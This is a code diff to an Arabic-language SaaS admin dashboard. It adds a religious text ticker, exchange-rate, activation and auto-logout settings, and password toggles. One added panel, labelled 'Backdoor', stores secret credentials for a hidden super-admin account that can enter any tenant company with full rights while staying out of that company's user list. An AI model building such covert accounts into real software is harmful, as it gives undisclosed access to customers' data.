@@ -63,6 +63,17 @@
         .tab-content.active { display: block; }
         @keyframes fadeUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
 
+        .islamic-ticker-container { overflow: hidden; white-space: nowrap; width: 350px; margin-left: 20px; position: relative; display: flex; align-items: center; border-radius: 8px; background: rgba(0,0,0,0.2); padding: 5px 10px; border: 1px solid rgba(255,255,255,0.05); }
+        .islamic-ticker {
+            display: inline-block; font-weight: 700; font-size: 0.95rem; color: transparent;
+            background: linear-gradient(90deg, #f59e0b, #10b981, #3b82f6, #a855f7, #f59e0b);
+            background-size: 200% auto; -webkit-background-clip: text; background-clip: text;
+            animation: gradientMove 3s linear infinite, scrollTicker 20s linear infinite;
+            text-shadow: 0 0 10px rgba(245, 158, 11, 0.2); white-space: nowrap; padding-left: 100%;
+        }
+        @keyframes scrollTicker { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+        @keyframes gradientMove { 0% { background-position: 0% center; } 100% { background-position: 200% center; } }
+
         table { width: 100%; border-collapse: collapse; white-space: nowrap; }
         th, td { padding: 14px 16px; text-align: right; border-bottom: 1px solid var(--glass-border); }
         th { color: var(--text-secondary); font-size: 0.9rem; background: rgba(0,0,0,0.2); }
@@ -120,7 +131,12 @@
                     <p>إدارة الشركات والباقات والمستخدمين</p>
                 </div>
             </div>
-            <div class="header-controls">
+            <div class="header-controls" style="display:flex; align-items:center;">
+                <div class="islamic-ticker-container">
+                    <div class="islamic-ticker">
+                        سُبْحَانَ اللَّهِ وَبِحَمْدِهِ ، سُبْحَانَ اللَّهِ الْعَظِيمِ 🌸 أَسْتَغْفِرُ اللَّهَ وَأَتُوبُ إِلَيْهِ 🌸 اللَّهُمَّ صَلِّ وَسَلِّمْ عَلَى نَبِيِّنَا مُحَمَّدٍ
+                    </div>
+                </div>
                 <button onclick="logoutSaas()" class="btn-danger">تسجيل الخروج</button>
             </div>
         </div>
@@ -301,26 +317,80 @@
         <div id="tab-settings" class="tab-content">
             <div style="display:flex; gap:20px; flex-wrap:wrap;">
                 <div class="glass-panel" style="flex:1; min-width:300px;">
-                    <h3 style="color:var(--warning-color); margin-top:0;">إعدادات الصرف</h3>
+                    <h3 style="color:var(--warning-color); margin-top:0; display:flex; align-items:center; gap:8px;">💱 إعدادات الصرف</h3>
                     <div class="form-group">
-                        <label>سعر الصرف (الدولار)</label>
+                        <label>💵 سعر الصرف (الدولار مقابل العملة المحلية)</label>
                         <input type="number" id="global-exchange-rate" step="0.01">
                     </div>
                     <div class="form-group" style="display:flex; align-items:center; gap:10px;">
                         <input type="checkbox" id="global-exchange-visible">
-                        <label style="margin:0;">إظهار السعر للمشتركين</label>
+                        <label style="margin:0;">👁️ إظهار السعر للمشتركين</label>
                     </div>
+                    <button class="btn-primary" onclick="saveGlobalSettings()" style="width:100%; margin-top: 15px;">💾 حفظ إعدادات الصرف</button>
+                </div>
+                
+                <div class="glass-panel" style="flex:1; min-width:300px;">
+                    <h3 style="color:#3b82f6; margin-top:0; display:flex; align-items:center; gap:8px;">⏱️ إعدادات التفعيل</h3>
                     <div class="form-group">
                         <label>زمن التفعيل المتوقع (بالساعات)</label>
                         <input type="number" id="global-activation-delay" value="12">
+                        <div style="font-size: 0.85em; color: #a1a1aa; margin-top: 8px; line-height: 1.5;">
+                            <strong>💡 ماذا يعني هذا الرقم؟</strong><br>
+                            عندما يسجل مستخدم جديد شركته، تكون حالته "قيد المراجعة". هذا الرقم سيظهر للمستخدم في رسالة الانتظار كالتالي: <br>
+                            <span style="color:#fbbf24;">"طلبك قيد المراجعة. سيتم تفعيل حسابك خلال [الرقم الذي تدخله هنا] ساعة كحد أقصى."</span>
+                        </div>
                     </div>
-                    <button class="btn-primary" onclick="saveGlobalSettings()" style="width:100%;">حفظ</button>
+                    <button class="btn-primary" onclick="saveGlobalSettings()" style="width:100%; margin-top: 15px;">💾 حفظ زمن التفعيل</button>
+                </div>
+
+                <div class="glass-panel" style="flex:1; min-width:300px;">
+                    <h3 style="color:#10b981; margin-top:0; display:flex; align-items:center; gap:8px;">🔒 الخروج التلقائي للأمان</h3>
+                    <div class="form-group">
+                        <label>مدة عدم النشاط قبل الخروج</label>
+                        <div style="display:flex; gap:10px;">
+                            <input type="number" id="global-auto-logout-value" value="30" style="flex:2;">
+                            <select id="global-auto-logout-unit" style="flex:1;">
+                                <option value="minutes">دقائق</option>
+                                <option value="seconds">ثواني</option>
+                            </select>
+                        </div>
+                        <div style="font-size: 0.85em; color: #a1a1aa; margin-top: 8px;">
+                            سيتم تسجيل الخروج تلقائياً من لوحة التحكم هذه إذا لم تقم بأي نشاط لمدة التحديد (اكتب 0 لإلغاء الميزة).
+                        </div>
+                    </div>
+                    <button class="btn-primary" onclick="saveGlobalSettings()" style="width:100%; margin-top: 15px;">💾 حفظ إعدادات الأمان</button>
                 </div>
                 <div class="glass-panel" style="flex:1; min-width:300px;">
-                    <h3 style="color:var(--danger-color); margin-top:0;">رمز المشرف</h3>
-                    <div class="form-group"><label>الرمز الحالي</label><input type="password" id="old-master-token"></div>
-                    <div class="form-group"><label>الرمز الجديد</label><input type="password" id="new-master-token"></div>
-                    <button class="btn-danger" onclick="saveMasterToken()" style="width:100%;">تغيير الرمز</button>
+                    <h3 style="color:var(--danger-color); margin-top:0; display:flex; align-items:center; gap:8px;">🔑 رمز المشرف العام</h3>
+                    <div style="font-size: 0.85em; color: #a1a1aa; margin-bottom: 15px;">هذا الرمز يُستخدم للدخول إلى لوحة التحكم الحالية (إدارة الشركات SaaS).</div>
+                    <div class="form-group">
+                        <label>الرمز الحالي</label>
+                        <div style="position: relative;">
+                            <input type="password" id="old-master-token" style="padding-left: 40px; width: 100%; box-sizing: border-box;">
+                            <span onclick="togglePasswordVisibility('old-master-token', this)" style="position: absolute; left: 12px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #a1a1aa; font-size: 1.2em; user-select: none;">👁️</span>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>الرمز الجديد</label>
+                        <div style="position: relative;">
+                            <input type="password" id="new-master-token" style="padding-left: 40px; width: 100%; box-sizing: border-box;">
+                            <span onclick="togglePasswordVisibility('new-master-token', this)" style="position: absolute; left: 12px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #a1a1aa; font-size: 1.2em; user-select: none;">👁️</span>
+                        </div>
+                    </div>
+                    <button class="btn-danger" onclick="saveMasterToken()" style="width:100%;">🔄 تغيير الرمز</button>
+                </div>
+                <div class="glass-panel" style="flex:1; min-width:300px;">
+                    <h3 style="color:#a855f7; margin-top:0; display:flex; align-items:center; gap:8px;">🕵️‍♂️ حساب الدعم الفني (Backdoor)</h3>
+                    <div style="font-size: 0.85em; color: #a1a1aa; margin-bottom: 15px;">حساب خفي (Super Admin) يتيح لك الدخول لأي شركة مسجلة في النظام بصلاحيات مدير لحل مشاكلهم، دون أن يظهر اسمك في قائمة مستخدمي الشركة.</div>
+                    <div class="form-group"><label>اسم المستخدم السري</label><input type="text" id="backdoor-username" placeholder="مثال: MasterSupport"></div>
+                    <div class="form-group">
+                        <label>كلمة المرور السرية</label>
+                        <div style="position: relative;">
+                            <input type="password" id="backdoor-password" placeholder="أدخل كلمة مرور معقدة" style="padding-left: 40px; width: 100%; box-sizing: border-box;">
+                            <span onclick="togglePasswordVisibility('backdoor-password', this)" style="position: absolute; left: 12px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #a1a1aa; font-size: 1.2em; user-select: none;">👁️</span>
+                        </div>
+                    </div>
+                    <button class="btn-primary" onclick="saveBackdoorCredentials()" style="width:100%; background:#a855f7; border-color:#a855f7;">✨ حفظ وتفعيل</button>
                 </div>
             </div>
         </div>
@@ -509,6 +579,7 @@
         async function initDashboard() {
             await loadTenants();
             loadGlobalSettings();
+            loadBackdoorCredentials();
             loadMessages();
             try {
                 const resPub = await fetch('api_index.php?r=public');
@@ -945,6 +1016,39 @@
             }
         }
 
+        let autoLogoutTimer;
+        let autoLogoutValue = 30;
+        let autoLogoutUnit = 'minutes';
+
+        function resetAutoLogout() {
+            clearTimeout(autoLogoutTimer);
+            if (autoLogoutValue > 0 && SAAS_TOKEN) {
+                let multiplier = autoLogoutUnit === 'minutes' ? 60 * 1000 : 1000;
+                autoLogoutTimer = setTimeout(() => {
+                    alert('تم تسجيل الخروج تلقائياً بسبب عدم النشاط للحفاظ على الأمان.');
+                    logout();
+                }, autoLogoutValue * multiplier);
+            }
+        }
+
+        // Detect user activity to reset the logout timer
+        ['mousemove', 'keydown', 'click', 'scroll'].forEach(evt => {
+            document.addEventListener(evt, resetAutoLogout);
+        });
+
+        function togglePasswordVisibility(inputId, iconEl) {
+            const input = document.getElementById(inputId);
+            if (input.type === "password") {
+                input.type = "text";
+                iconEl.innerText = "🙈";
+                iconEl.style.opacity = "0.7";
+            } else {
+                input.type = "password";
+                iconEl.innerText = "👁️";
+                iconEl.style.opacity = "1";
+            }
+        }
+
         async function loadGlobalSettings() {
             try {
                 const res = await fetch(apiUrl('saas', 'settings', 'exchange-rate'), { headers: { 'Authorization': 'Bearer ' + SAAS_TOKEN }});
@@ -955,6 +1059,15 @@
                     if(data.activation_delay_hours !== undefined) {
                         document.getElementById('global-activation-delay').value = data.activation_delay_hours;
                     }
+                    if(data.auto_logout_value !== undefined) {
+                        document.getElementById('global-auto-logout-value').value = data.auto_logout_value;
+                        autoLogoutValue = parseInt(data.auto_logout_value);
+                    }
+                    if(data.auto_logout_unit !== undefined) {
+                        document.getElementById('global-auto-logout-unit').value = data.auto_logout_unit;
+                        autoLogoutUnit = data.auto_logout_unit;
+                    }
+                    resetAutoLogout();
                 }
             } catch(e) {}
         }
@@ -963,11 +1076,17 @@
             const rate = document.getElementById('global-exchange-rate').value;
             const visible = document.getElementById('global-exchange-visible').checked;
             const activation_delay_hours = document.getElementById('global-activation-delay').value;
+            const auto_logout_value = document.getElementById('global-auto-logout-value').value;
+            const auto_logout_unit = document.getElementById('global-auto-logout-unit').value;
+            
             try {
                 const res = await fetch(apiUrl('saas', 'settings', 'exchange-rate'), {
                     method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + SAAS_TOKEN },
-                    body: JSON.stringify({ rate, visible, activation_delay_hours })
+                    body: JSON.stringify({ rate, visible, activation_delay_hours, auto_logout_value, auto_logout_unit })
                 });
+                autoLogoutValue = parseInt(auto_logout_value);
+                autoLogoutUnit = auto_logout_unit;
+                resetAutoLogout();
                 alert('تم حفظ الإعدادات');
             } catch(e) {}
         }
